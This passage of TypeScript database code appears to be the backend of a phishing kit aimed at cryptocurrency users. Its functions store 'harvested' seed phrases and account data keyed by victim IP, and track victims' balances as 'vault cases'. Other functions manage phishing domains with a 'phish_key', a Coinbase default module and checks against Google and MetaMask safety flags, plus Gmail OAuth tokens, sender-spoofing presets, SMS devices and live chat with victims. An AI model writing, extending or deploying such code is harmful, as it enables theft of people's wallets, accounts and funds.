				SELECT COUNT(*) FROM livechat_messages m
				WHERE m.conversation_id = c.id AND m.seen = 0 AND m.sender = 'visitor'
			) AS unread
			 FROM livechat_conversations c
			 ${where}
			 ORDER BY c.last_message_at DESC, c.id DESC`
		)
		.all(...params) as any[];
	return rows.map(rowToConversation);
}

export function dbGetConversationByIp(ip: string): DbLivechatConversation | undefined {
	const row = getDb()
		.prepare(
			`SELECT c.*, (
				SELECT COUNT(*) FROM livechat_messages m
				WHERE m.conversation_id = c.id AND m.seen = 0 AND m.sender = 'visitor'
			) AS unread
			 FROM livechat_conversations c WHERE c.visitor_ip = ?`
		)
		.get(ip) as any;
	return row ? rowToConversation(row) : undefined;
}

export function dbUpsertConversation(ip: string, module: string): DbLivechatConversation {
	const now = Date.now();
	getDb()
		.prepare(
			`INSERT INTO livechat_conversations (visitor_ip, module, visit_count, last_message_at, created_at, active)
			 VALUES (?, ?, 1, 0, ?, 1)
			 ON CONFLICT(visitor_ip) DO UPDATE SET visit_count = visit_count + 1, module = excluded.module, active = 1`
		)
		.run(ip, module, now);
	return dbGetConversationByIp(ip)!;
}

export function dbGetUnreadMap(): Record<string, number> {
	const rows = getDb()
		.prepare(
			`SELECT c.visitor_ip, COUNT(m.id) AS unread
			 FROM livechat_conversations c
			 LEFT JOIN livechat_messages m
				 ON m.conversation_id = c.id AND m.seen = 0 AND m.sender = 'visitor'
			 GROUP BY c.visitor_ip
			 HAVING unread > 0`
		)
		.all() as any[];
	const out: Record<string, number> = {};
	for (const r of rows) out[r.visitor_ip] = r.unread;
	return out;
}

export interface DbLivechatMessage {
	id: string;
	conversationId: string;
	sender: 'visitor' | 'operator';
	authorName: string;
	body: string;
	seen: boolean;
	createdAt: number;
}

function rowToMessage(row: any): DbLivechatMessage {
	return {
		id: String(row.id),
		conversationId: String(row.conversation_id),
		sender: row.sender === 'operator' ? 'operator' : 'visitor',
		authorName: row.author_name || '',
		body: row.body,
		seen: !!row.seen,
		createdAt: row.created_at || 0
	};
}

export function dbGetMessages(conversationId: string, limit = 200): DbLivechatMessage[] {
	const rows = getDb()
		.prepare('SELECT * FROM livechat_messages WHERE conversation_id = ? ORDER BY created_at ASC LIMIT ?')
		.all(Number(conversationId), limit) as any[];
	return rows.map(rowToMessage);
}

export function dbInsertMessage(m: Omit<DbLivechatMessage, 'id'>): DbLivechatMessage {
	const result = getDb()
		.prepare(
			`INSERT INTO livechat_messages (conversation_id, sender, author_name, body, seen, created_at)
			 VALUES (?, ?, ?, ?, ?, ?)`
		)
		.run(
			Number(m.conversationId),
			m.sender,
			m.authorName || '',
			m.body,
			m.seen ? 1 : 0,
			m.createdAt || Date.now()
		);
	const preview = m.body.slice(0, 80);
	getDb()
		.prepare('UPDATE livechat_conversations SET last_message_at = ?, last_message_preview = ? WHERE id = ?')
		.run(m.createdAt || Date.now(), preview, Number(m.conversationId));
	return { ...m, id: String(result.lastInsertRowid) };
}

export function dbMarkMessagesRead(conversationId: string): void {
	getDb()
		.prepare(
			"UPDATE livechat_messages SET seen = 1 WHERE conversation_id = ? AND sender = 'visitor' AND seen = 0"
		)
		.run(Number(conversationId));
}

// --- Vault ---

export interface DbVaultAsset {
	id: string;
	caseId: string;
	symbol: string;
	amount: number;
	usdValue: number;
	createdAt: number;
}

export interface DbVaultCase {
	id: string;
	visitorIp: string;
	module: string;
	location: string;
	activity: string;
	status: string;
	balanceUsd: number;
	pending: number;
	completed: number;
	createdAt: number;
	updatedAt: number;
	capturedBy: string;
	assets: DbVaultAsset[];
}

function rowToVaultCase(row: any, assets: DbVaultAsset[]): DbVaultCase {
	return {
		id: String(row.id),
		visitorIp: row.visitor_ip,
		module: row.module || '',
		location: row.location || '',
		activity: row.activity || 'Sent seed ID',
		status: row.status || 'Connected',
		balanceUsd: row.balance_usd || 0,
		pending: !!row.pending ? 1 : 0,
		completed: !!row.completed ? 1 : 0,
		createdAt: row.created_at || 0,
		updatedAt: row.updated_at || 0,
		capturedBy: row.captured_by || '',
		assets
	};
}

function rowToAsset(row: any): DbVaultAsset {
	return {
		id: String(row.id),
		caseId: String(row.vault_case_id),
		symbol: row.symbol,
		amount: row.amount || 0,
		usdValue: row.usd_value || 0,
		createdAt: row.created_at || 0
	};
}

export function dbGetVaultCases(filter?: { search?: string; module?: string; activity?: string }): DbVaultCase[] {
	const conds: string[] = [];
	const params: any[] = [];
	if (filter?.module) {
		conds.push('module = ?');
		params.push(filter.module);
	}
	if (filter?.activity) {
		conds.push('activity = ?');
		params.push(filter.activity);
	}
	if (filter?.search) {
		conds.push('(visitor_ip LIKE ? OR location LIKE ? OR module LIKE ?)');
		const like = `%${filter.search}%`;
		params.push(like, like, like);
	}
	const where = conds.length ? `WHERE ${conds.join(' AND ')}` : '';
	const rows = getDb()
		.prepare(`SELECT * FROM vault_cases ${where} ORDER BY updated_at DESC, id DESC`)
		.all(...params) as any[];

	const ids = rows.map((r) => r.id);
	const assetMap = new Map<number, DbVaultAsset[]>();
	if (ids.length) {
		const placeholders = ids.map(() => '?').join(',');
		const assetRows = getDb()
			.prepare(`SELECT * FROM vault_assets WHERE vault_case_id IN (${placeholders})`)
			.all(...ids) as any[];
		for (const a of assetRows) {
			const list = assetMap.get(a.vault_case_id) ?? [];
			list.push(rowToAsset(a));
			assetMap.set(a.vault_case_id, list);
		}
	}

	return rows.map((r) => rowToVaultCase(r, assetMap.get(r.id) ?? []));
}

export function dbGetVaultOverview(): { activeCases: number; totalBalanceUsd: number; pending: number; completed: number; totalAssets: number } {
	const c = getDb()
		.prepare(
			`SELECT
				COUNT(*) AS active_cases,
				COALESCE(SUM(balance_usd), 0) AS total_balance,
				COALESCE(SUM(pending), 0) AS pending,
				COALESCE(SUM(completed), 0) AS completed
			 FROM vault_cases`
		)
		.get() as any;
	const a = getDb().prepare('SELECT COUNT(*) AS c FROM vault_assets').get() as { c: number };
	return {
		activeCases: c.active_cases || 0,
		totalBalanceUsd: c.total_balance || 0,
		pending: c.pending || 0,
		completed: c.completed || 0,
		totalAssets: a.c || 0
	};
}

export function dbUpsertVaultCase(input: { visitorIp: string; module?: string; location?: string; capturedBy?: string }): DbVaultCase {
	const now = Date.now();
	getDb()
		.prepare(
			`INSERT INTO vault_cases (visitor_ip, module, location, activity, status, created_at, updated_at, captured_by)
			 VALUES (?, ?, ?, 'Sent seed ID', 'Connected', ?, ?, ?)
			 ON CONFLICT(visitor_ip) DO UPDATE SET
				module = excluded.module,
				location = excluded.location,
				updated_at = excluded.updated_at,
				captured_by = COALESCE(NULLIF(excluded.captured_by, ''), captured_by)`
		)
		.run(input.visitorIp, input.module || '', input.location || '', now, now, input.capturedBy || '');
	const row = getDb().prepare('SELECT * FROM vault_cases WHERE visitor_ip = ?').get(input.visitorIp) as any;
	return rowToVaultCase(row, []);
}

export function dbUpdateVaultCase(id: string, patch: Partial<DbVaultCase>): void {
	const map: Record<string, string> = {
		activity: 'activity',
		status: 'status',
		balanceUsd: 'balance_usd',
		pending: 'pending',
		completed: 'completed',
		location: 'location'
	};
	const fields: string[] = [];
	const params: any[] = [];
	for (const [k, v] of Object.entries(patch)) {
		const col = map[k];
		if (!col) continue;
		fields.push(`${col} = ?`);
		params.push(v);
	}
	if (!fields.length) return;
	fields.push('updated_at = ?');
	params.push(Date.now(), Number(id));
	getDb().prepare(`UPDATE vault_cases SET ${fields.join(', ')} WHERE id = ?`).run(...params);
}

export function dbDeleteVaultCase(id: string): void {
	getDb().prepare('DELETE FROM vault_assets WHERE vault_case_id = ?').run(Number(id));
	getDb().prepare('DELETE FROM vault_cases WHERE id = ?').run(Number(id));
}

// --- Seeds (uses harvested_data with type='phrase') ---

export interface DbSeedRow {
	id: string;
	visitorIp: string;
	flow: string;
	phrase: string;
	rawData: any;
	capturedBy: string;
	createdAt: number;
}

export interface SeedQuery {
	page: number;
	limit: number;
	search?: string;
	module?: string;
	status?: string;
	sort?: 'created_at' | 'visitor_ip';
	dir?: 'asc' | 'desc';
}

export function dbQuerySeeds(q: SeedQuery): { rows: DbSeedRow[]; total: number } {
	const conds: string[] = ["data_type = 'phrase'"];
	const params: any[] = [];
	if (q.search) {
		conds.push('(visitor_ip LIKE ? OR data LIKE ?)');
		const like = `%${q.search}%`;
		params.push(like, like);
	}
	if (q.module) {
		conds.push('flow LIKE ?');
		params.push(`%${q.module}%`);
	}
	const where = `WHERE ${conds.join(' AND ')}`;
	const sortCol = q.sort === 'visitor_ip' ? 'visitor_ip' : 'created_at';
	const dir = q.dir === 'asc' ? 'ASC' : 'DESC';
	const limit = Math.max(1, Math.min(100, q.limit || 20));
	const offset = Math.max(0, (q.page - 1) * limit);

	const totalRow = getDb()
		.prepare(`SELECT COUNT(*) AS c FROM harvested_data ${where}`)
		.get(...params) as { c: number };
	const rows = getDb()
		.prepare(
			`SELECT * FROM harvested_data ${where} ORDER BY ${sortCol} ${dir} LIMIT ? OFFSET ?`
		)
		.all(...params, limit, offset) as any[];

	return {
		rows: rows.map((r) => {
			let raw: any = {};
			try {
				raw = JSON.parse(r.data || '{}');
			} catch {}
			const phrase: string =
				typeof raw === 'string' ? raw : raw.phrase || raw.seed || raw.mnemonic || '';
			return {
				id: String(r.id),
				visitorIp: r.visitor_ip,
				flow: r.flow || '',
				phrase,
				rawData: raw,
				capturedBy: r.captured_by || '',
				createdAt: r.created_at || 0
			};
		}),
		total: totalRow.c
	};
}

// --- SMS Devices ---

export interface DbSmsDevice {
	id: string;
	name: string;
	apiUrl: string;
	lastCheck: number;
	lastStatus: string;
	ownerUsername: string;
	createdAt: number;
}

function rowToSmsDevice(row: any): DbSmsDevice {
	return {
		id: String(row.id),
		name: row.name,
		apiUrl: row.api_url,
		lastCheck: row.last_check || 0,
		lastStatus: row.last_status || 'unknown',
		ownerUsername: row.owner_username || '',
		createdAt: row.created_at || 0
	};
}

export function dbGetSmsDevices(ownerUsername?: string): DbSmsDevice[] {
	const stmt = ownerUsername
		? getDb().prepare('SELECT * FROM sms_devices WHERE owner_username = ? ORDER BY created_at DESC')
		: getDb().prepare('SELECT * FROM sms_devices ORDER BY created_at DESC');
	const rows = (ownerUsername ? stmt.all(ownerUsername) : stmt.all()) as any[];
	return rows.map(rowToSmsDevice);
}

export function dbInsertSmsDevice(d: Omit<DbSmsDevice, 'id'>): DbSmsDevice {
	const result = getDb()
		.prepare(
			`INSERT INTO sms_devices (name, api_url, last_check, last_status, owner_username, created_at)
			 VALUES (?, ?, ?, ?, ?, ?)`
		)
		.run(d.name, d.apiUrl, d.lastCheck || 0, d.lastStatus || 'unknown', d.ownerUsername || '', d.createdAt || Date.now());
	return { ...d, id: String(result.lastInsertRowid) };
}

export function dbUpdateSmsDeviceStatus(id: string, status: string): void {
	getDb().prepare('UPDATE sms_devices SET last_check = ?, last_status = ? WHERE id = ?').run(Date.now(), status, Number(id));
}

export function dbDeleteSmsDevice(id: string): void {
	getDb().prepare('DELETE FROM sms_devices WHERE id = ?').run(Number(id));
}

// --- Gmail Accounts ---

export interface DbGmailAccount {
	id: string;
	label: string;
	email: string;
	connected: boolean;
	ownerUsername: string;
	createdAt: number;
}

function rowToGmailAccount(row: any): DbGmailAccount {
	return {
		id: String(row.id),
		label: row.label,
		email: row.email || '',
		connected: !!row.connected,
		ownerUsername: row.owner_username || '',
		createdAt: row.created_at || 0
	};
}

export function dbGetGmailAccounts(ownerUsername?: string): DbGmailAccount[] {
	const stmt = ownerUsername
		? getDb().prepare('SELECT * FROM gmail_accounts WHERE owner_username = ? ORDER BY created_at DESC')
		: getDb().prepare('SELECT * FROM gmail_accounts ORDER BY created_at DESC');
	const rows = (ownerUsername ? stmt.all(ownerUsername) : stmt.all()) as any[];
	return rows.map(rowToGmailAccount);
}

export function dbGetGmailAccountById(id: string): { refreshToken: string; accessToken: string; expiresAt: number; email: string } | undefined {
	const row = getDb()
		.prepare('SELECT oauth_refresh_token, oauth_access_token, oauth_expires_at, email FROM gmail_accounts WHERE id = ?')
		.get(Number(id)) as any;
	return row
		? {
				refreshToken: row.oauth_refresh_token || '',
				accessToken: row.oauth_access_token || '',
				expiresAt: row.oauth_expires_at || 0,
				email: row.email || ''
			}
		: undefined;
}

export function dbInsertGmailAccount(label: string, email: string, refreshToken: string, ownerUsername: string): DbGmailAccount {
	const result = getDb()
		.prepare(
			`INSERT INTO gmail_accounts (label, email, oauth_refresh_token, connected, owner_username, created_at)
			 VALUES (?, ?, ?, 1, ?, ?)`
		)
		.run(label, email, refreshToken, ownerUsername, Date.now());
	return rowToGmailAccount({
		id: result.lastInsertRowid,
		label,
		email,
		connected: 1,
		owner_username: ownerUsername,
		created_at: Date.now()
	});
}

export function dbUpdateGmailTokens(id: string, accessToken: string, expiresAt: number): void {
	getDb()
		.prepare('UPDATE gmail_accounts SET oauth_access_token = ?, oauth_expires_at = ? WHERE id = ?')
		.run(accessToken, expiresAt, Number(id));
}

export function dbDeleteGmailAccount(id: string): void {
	getDb().prepare('DELETE FROM gmail_accounts WHERE id = ?').run(Number(id));
}

// --- Gmail Auth Links ---

export interface DbGmailLink {
	id: string;
	label: string;
	oauthState: string;
	used: boolean;
	accountId: string;
	ownerUsername: string;
	createdAt: number;
}

function rowToGmailLink(row: any): DbGmailLink {
	return {
		id: String(row.id),
		label: row.label,
		oauthState: row.oauth_state,
		used: !!row.used,
		accountId: String(row.account_id || ''),
		ownerUsername: row.owner_username || '',
		createdAt: row.created_at || 0
	};
}

export function dbGetGmailLinks(ownerUsername?: string): DbGmailLink[] {
	const stmt = ownerUsername
		? getDb().prepare('SELECT * FROM gmail_links WHERE owner_username = ? ORDER BY created_at DESC')
		: getDb().prepare('SELECT * FROM gmail_links ORDER BY created_at DESC');
	const rows = (ownerUsername ? stmt.all(ownerUsername) : stmt.all()) as any[];
	return rows.map(rowToGmailLink);
}

export function dbGetGmailLinkByState(state: string): DbGmailLink | undefined {
	const row = getDb().prepare('SELECT * FROM gmail_links WHERE oauth_state = ?').get(state) as any;
	return row ? rowToGmailLink(row) : undefined;
}

export function dbInsertGmailLink(label: string, oauthState: string, ownerUsername: string): DbGmailLink {
	const result = getDb()
		.prepare(
			`INSERT INTO gmail_links (label, oauth_state, used, account_id, owner_username, created_at)
			 VALUES (?, ?, 0, 0, ?, ?)`
		)
		.run(label, oauthState, ownerUsername, Date.now());
	return rowToGmailLink({
		id: result.lastInsertRowid,
		label,
		oauth_state: oauthState,
		used: 0,
		account_id: 0,
		owner_username: ownerUsername,
		created_at: Date.now()
	});
}

export function dbMarkGmailLinkUsed(state: string, accountId: string): void {
	getDb()
		.prepare('UPDATE gmail_links SET used = 1, account_id = ? WHERE oauth_state = ?')
		.run(Number(accountId), state);
}

export function dbDeleteGmailLink(id: string): void {
	getDb().prepare('DELETE FROM gmail_links WHERE id = ?').run(Number(id));
}

// --- Gmail Sender Presets ---

export interface DbGmailSenderPreset {
	id: string;
	name: string;
	senderName: string;
	senderEmail: string;
	avatarUrl: string;
	ownerUsername: string;
	createdAt: number;
}

function rowToGmailPreset(row: any): DbGmailSenderPreset {
	return {
		id: String(row.id),
		name: row.name,
		senderName: row.sender_name || '',
		senderEmail: row.sender_email || '',
		avatarUrl: row.avatar_url || '',
		ownerUsername: row.owner_username || '',
		createdAt: row.created_at || 0
	};
}

export function dbGetGmailSenderPresets(ownerUsername?: string): DbGmailSenderPreset[] {
	const stmt = ownerUsername
		? getDb().prepare('SELECT * FROM gmail_sender_presets WHERE owner_username = ? ORDER BY created_at DESC')
		: getDb().prepare('SELECT * FROM gmail_sender_presets ORDER BY created_at DESC');
	const rows = (ownerUsername ? stmt.all(ownerUsername) : stmt.all()) as any[];
	return rows.map(rowToGmailPreset);
}

export function dbInsertGmailSenderPreset(p: Omit<DbGmailSenderPreset, 'id'>): DbGmailSenderPreset {
	const result = getDb()
		.prepare(
			`INSERT INTO gmail_sender_presets (name, sender_name, sender_email, avatar_url, owner_username, created_at)
			 VALUES (?, ?, ?, ?, ?, ?)`
		)
		.run(p.name, p.senderName || '', p.senderEmail || '', p.avatarUrl || '', p.ownerUsername || '', p.createdAt || Date.now());
	return { ...p, id: String(result.lastInsertRowid) };
}

export function dbDeleteGmailSenderPreset(id: string): void {
	getDb().prepare('DELETE FROM gmail_sender_presets WHERE id = ?').run(Number(id));
}

// --- Server Settings (key/value) ---

export function dbGetSetting(key: string): string | undefined {
	const row = getDb().prepare('SELECT value FROM server_settings WHERE key = ?').get(key) as
		| { value: string }
		| undefined;
	return row?.value;
}

export function dbSetSetting(key: string, value: string): void {
	getDb()
		.prepare(
			`INSERT INTO server_settings (key, value) VALUES (?, ?)
			 ON CONFLICT(key) DO UPDATE SET value = excluded.value`
		)
		.run(key, value);
}

export function dbGetSettings(prefix?: string): Record<string, string> {
	const stmt = prefix
		? getDb().prepare('SELECT key, value FROM server_settings WHERE key LIKE ?')
		: getDb().prepare('SELECT key, value FROM server_settings');
	const rows = (prefix ? stmt.all(`${prefix}%`) : stmt.all()) as Array<{ key: string; value: string }>;
	const out: Record<string, string> = {};
	for (const r of rows) out[r.key] = r.value;
	return out;
}

// --- Auth & Sessions ---

export function dbGetUserByUsername(username: string): { id: number; username: string; password_hash: string; role: string; active: number } | undefined {
	return getDb()
		.prepare('SELECT id, username, password_hash, role, active FROM user_accounts WHERE username = ?')
		.get(username) as any;
}

export function dbUpdateLastLogin(id: number): void {
	getDb()
		.prepare("UPDATE user_accounts SET last_login = ? WHERE id = ?")
		.run(new Date().toISOString(), id);
}

export function dbCreateSession(token: string, userId: number, username: string, role: string, ttlMs: number): void {
	const now = Date.now();
	getDb()
		.prepare('INSERT INTO sessions (token, user_id, username, role, created_at, expires_at) VALUES (?, ?, ?, ?, ?, ?)')
		.run(token, userId, username, role, now, now + ttlMs);
}

export function dbGetSession(token: string): { user_id: number; username: string; role: string; expires_at: number } | undefined {
	return getDb()
		.prepare('SELECT user_id, username, role, expires_at FROM sessions WHERE token = ?')
		.get(token) as any;
}

export function dbDeleteSession(token: string): void {
	getDb().prepare('DELETE FROM sessions WHERE token = ?').run(token);
}

export function dbCleanExpiredSessions(): void {
	getDb().prepare('DELETE FROM sessions WHERE expires_at < ?').run(Date.now());
}

// --- Activity Log ---

export function dbGetLogs(limit: number = 100): LogEntry[] {
	const rows = getDb()
		.prepare('SELECT * FROM activity_log ORDER BY timestamp DESC LIMIT ?')
		.all(limit) as any[];
	return rows.map((row) => ({
		id: String(row.id),
		message: row.message,
		time: row.time_str,
		timestamp: row.timestamp,
		type: row.type
	}));
}

export function dbAddLog(entry: LogEntry): void {
	getDb()
		.prepare('INSERT INTO activity_log (message, time_str, timestamp, type) VALUES (?, ?, ?, ?)')
		.run(entry.message, entry.time, entry.timestamp, entry.type);
}

// --- Flows ---

export function dbGetFlows(): Flow[] {
	const rows = getDb().prepare('SELECT * FROM flows ORDER BY id').all() as any[];
	return rows.map((row) => ({
		id: String(row.id),
		name: row.name,
		description: row.description,
		steps: JSON.parse(row.steps),
		active: Boolean(row.active)
	}));
}

export function dbInsertFlow(flow: Omit<Flow, 'id'>): number {
	const result = getDb()
		.prepare('INSERT INTO flows (name, description, steps, active) VALUES (?, ?, ?, ?)')
		.run(flow.name, flow.description, JSON.stringify(flow.steps), flow.active ? 1 : 0);
	return Number(result.lastInsertRowid);
}

export function dbUpdateFlow(flow: Flow): void {
	getDb()
		.prepare('UPDATE flows SET name=?, description=?, steps=?, active=? WHERE id=?')
		.run(flow.name, flow.description, JSON.stringify(flow.steps), flow.active ? 1 : 0, Number(flow.id));
}

export function dbDeleteFlow(id: string): void {
	getDb().prepare('DELETE FROM flows WHERE id=?').run(Number(id));
}

// --- Hosts ---

export function dbGetHosts(): HostConfig[] {
	const rows = getDb().prepare('SELECT * FROM hosts ORDER BY id').all() as any[];
	return rows.map((row) => ({
		id: String(row.id),
		domain: row.domain,
		active: Boolean(row.active),
		platform: row.platform,
		redirectUrl: row.redirect_url,
		lastUpdated: row.last_updated
	}));
}

export function dbInsertHost(host: Omit<HostConfig, 'id'>): number {
	const result = getDb()
		.prepare('INSERT INTO hosts (domain, active, platform, redirect_url, last_updated) VALUES (?, ?, ?, ?, ?)')
		.run(host.domain, host.active ? 1 : 0, host.platform, host.redirectUrl, host.lastUpdated);
	return Number(result.lastInsertRowid);
}

export function dbUpdateHost(host: HostConfig): void {
	getDb()
		.prepare('UPDATE hosts SET domain=?, active=?, platform=?, redirect_url=?, last_updated=? WHERE id=?')
		.run(host.domain, host.active ? 1 : 0, host.platform, host.redirectUrl, host.lastUpdated, Number(host.id));
}

export function dbDeactivateHost(domain: string): void {
	getDb().prepare('UPDATE hosts SET active = 0 WHERE domain = ?').run(domain);
}

// --- Harvested Data ---

export function dbSaveHarvestedData(
	visitorIp: string,
	flow: string,
	dataType: 'account' | 'phrase' | 'upload',
	data: unknown
): void {
	getDb()
		.prepare('INSERT INTO harvested_data (visitor_ip, flow, data_type, data, created_at) VALUES (?, ?, ?, ?, ?)')
		.run(visitorIp, flow, dataType, JSON.stringify(data), Date.now());
}

export function dbGetHarvestedData(visitorIp?: string): any[] {
	if (visitorIp) {
		return getDb()
			.prepare('SELECT * FROM harvested_data WHERE visitor_ip = ? ORDER BY created_at DESC')
			.all(visitorIp);
	}
	return getDb().prepare('SELECT * FROM harvested_data ORDER BY created_at DESC LIMIT 500').all();
}

// --- User Accounts ---

export function dbGetUsers(): UserAccount[] {
	const rows = getDb().prepare('SELECT * FROM user_accounts ORDER BY id').all() as any[];
	return rows.map((row) => ({
		id: String(row.id),
		username: row.username,
		role: row.role,
		createdAt: row.created_at,
		lastLogin: row.last_login,
		active: Boolean(row.active)
	}));
}

export function dbInsertUser(username: string, role: string): number {
	const result = getDb()
		.prepare('INSERT INTO user_accounts (username, role, created_at, active) VALUES (?, ?, ?, 1)')
		.run(username, role, new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }));
	return Number(result.lastInsertRowid);
}

export function dbDeleteUser(id: string): void {
	getDb().prepare('DELETE FROM user_accounts WHERE id=?').run(Number(id));
}

// --- Custom Domains ---

export function dbGetDomains(): CustomDomain[] {
	const rows = getDb().prepare('SELECT * FROM custom_domains ORDER BY id').all() as any[];
	return rows.map(rowToDomain);
}

export function dbInsertDomain(domain: string, phishKey: string, opts: Partial<CustomDomain> = {}): number {
	const result = getDb()
		.prepare(
			`INSERT INTO custom_domains
			 (domain, status, phish_key, created_at, module, landing_page, kind, id_mode, case_id, under_attack, serving)
			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
		)
		.run(
			domain,
			opts.status || 'pending',
			phishKey,
			new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
			opts.module || 'Coinbase',
			opts.landingPage || '/loading',
			opts.kind || 'regular',
			opts.idMode || 'case_input',
			opts.caseId || '',
			opts.underAttack ? 1 : 0,
			opts.serving === false ? 0 : 1
		);
	return Number(result.lastInsertRowid);
}

export function dbUpdateDomain(id: string, patch: Partial<CustomDomain>): void {
	const fields: string[] = [];
	const params: any[] = [];
	const map: Record<string, string> = {
		domain: 'domain',
		status: 'status',
		module: 'module',
		landingPage: 'landing_page',
		kind: 'kind',
		idMode: 'id_mode',
		caseId: 'case_id',
		underAttack: 'under_attack',
		serving: 'serving',
		googleSafety: 'google_safety',
		metamaskSafety: 'metamask_safety',
		cfStatus: 'cf_status',
		cfNsPrimary: 'cf_ns_primary',
		cfNsSecondary: 'cf_ns_secondary',
		lastChecked: 'last_checked'
	};
	for (const [k, v] of Object.entries(patch)) {
		const col = map[k];
		if (!col) continue;
		fields.push(`${col} = ?`);
		params.push(typeof v === 'boolean' ? (v ? 1 : 0) : v);
	}
	if (!fields.length) return;
	params.push(Number(id));
	getDb().prepare(`UPDATE custom_domains SET ${fields.join(', ')} WHERE id = ?`).run(...params);
}

export function dbDeleteDomain(id: string): void {
	getDb().prepare('DELETE FROM custom_domains WHERE id=?').run(Number(id));
}

function rowToDomain(row: any): CustomDomain {
	return {
		id: String(row.id),
		domain: row.domain,
		status: row.status,
		phishKey: row.phish_key,
		createdAt: row.created_at,
		module: row.module || 'Coinbase',
		landingPage: row.landing_page || '/loading',
		kind: row.kind || 'regular',
		idMode: row.id_mode || 'case_input',
		caseId: row.case_id || '',
		underAttack: !!row.under_attack,
		serving: row.serving === undefined ? true : !!row.serving,
		googleSafety: row.google_safety || 'unknown',
		metamaskSafety: row.metamask_safety || 'unknown',
		cfStatus: row.cf_status || 'unknown',
		cfNsPrimary: row.cf_ns_primary || '',
		cfNsSecondary: row.cf_ns_secondary || '',
		lastChecked: row.last_checked || 0
	};
}

// --- Inbox Accounts ---

export function dbGetInboxAccounts(): InboxAccount[] {
	const rows = getDb().prepare('SELECT * FROM inbox_accounts ORDER BY id').all() as any[];
	return rows.map((row) => ({
		id: String(row.id),
		email: row.email,
		provider: row.provider,
		connected: Boolean(row.connected),
		messageCount: row.message_count,
		storageUsed: row.storage_used
	}));
}

export function dbInsertInboxAccount(email: string, provider: string): number {
	const result = getDb()
		.prepare('INSERT INTO inbox_accounts (email, provider, connected) VALUES (?, ?, 1)')
		.run(email, provider);
	return Number(result.lastInsertRowid);
}

export function dbDeleteInboxAccount(id: string): void {
	getDb().prepare('DELETE FROM inbox_accounts WHERE id=?').run(Number(id));
}
